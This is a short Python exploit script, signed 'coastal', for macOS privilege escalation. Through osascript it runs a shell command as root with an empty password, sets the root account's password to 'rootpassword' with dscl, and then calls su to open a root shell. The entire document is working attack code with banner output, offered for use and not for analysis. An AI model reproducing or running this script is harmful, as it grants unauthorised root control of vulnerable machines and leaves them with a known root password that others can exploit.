import subprocess

print("\t#########################")
print("\t# getting you root\t#")
print("\t#\t-coastal\t#")
print("\t#########################")

create_root = ["/usr/bin/osascript", "-e", 'do shell script "dscl . -passwd /Users/root rootpassword" user name "root" password "" with administrator privileges']
print("[*] creating root account")
subprocess.call(create_root)
print("[*] changing root account password to 'rootpassword'")
subprocess.call(create_root)
print("[*] getting a root shell for you (enter 'rootpassword' when prompted)")
subprocess.call("su")
